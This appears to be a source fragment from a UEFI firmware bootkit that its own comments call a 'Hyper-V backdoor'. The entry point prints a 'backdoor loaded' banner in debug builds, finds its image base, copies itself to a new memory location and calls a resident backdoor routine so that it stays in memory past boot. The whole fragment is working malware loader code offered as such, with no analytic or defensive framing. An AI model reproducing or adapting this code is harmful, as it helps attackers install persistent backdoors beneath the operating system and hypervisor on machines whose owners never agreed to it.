_ModuleEntryPoint(
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable) 
{    
    m_ST = SystemTable;    
    m_BS = SystemTable->BootServices;    
    m_RT = SystemTable->RuntimeServices;

#if defined(BACKDOOR_DEBUG)
#if defined(BACKDOOR_DEBUG_SERIAL)

    // initialize serial port I/O for debug messages
    SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);

#endif

    // initialize text output
    ConsoleInitialize();

    DbgMsg(__FILE__, __LINE__, "******************************\r\n");
    DbgMsg(__FILE__, __LINE__, "                              \r\n");
    DbgMsg(__FILE__, __LINE__, "  Hyper-V backdoor loaded!    \r\n");
    DbgMsg(__FILE__, __LINE__, "                              \r\n");
    DbgMsg(__FILE__, __LINE__, "******************************\r\n");

#endif

    if (m_ImageBase == NULL)
    {   
        if (ImageHandle)
        {     
            EFI_LOADED_IMAGE *LoadedImage = NULL;

            // bootkit was loaded as EFI application
            EFI_STATUS Status = m_BS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID **)&LoadedImage);      
            if (Status == EFI_SUCCESS)
            {
                // get current image base
                m_ImageBase = LoadedImage->ImageBase;
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "HandleProtocol() fails: 0x%X\r\n", Status);
            }
        }
        else
        {
            // get backdoor image base address
            m_ImageBase = ImageBaseByAddress(get_addr());
        }
    }

    if (m_ImageBase)
    {
        VOID *Image = NULL;

        DbgMsg(__FILE__, __LINE__, "Image address is "FPTR"\r\n", m_ImageBase);

        // copy image to the new location
        if ((Image = BackdoorImageRealocate(m_ImageBase)) != NULL)
        {
            BACKDOOR_ENTRY_RESIDENT pEntry = (BACKDOOR_ENTRY_RESIDENT)RVATOVA(
                Image,
                (UINT8 *)BackdoorEntryResident - (UINT8 *)m_ImageBase
            );
            
            DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
            
            // initialize backdoor resident code
            pEntry(Image);
        } 
    }

#if defined(BACKDOOR_DEBUG) && defined(BACKDOOR_DEBUG_SPLASH)

    m_BS->Stall(TO_MICROSECONDS(3));

#endif

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
// EoF
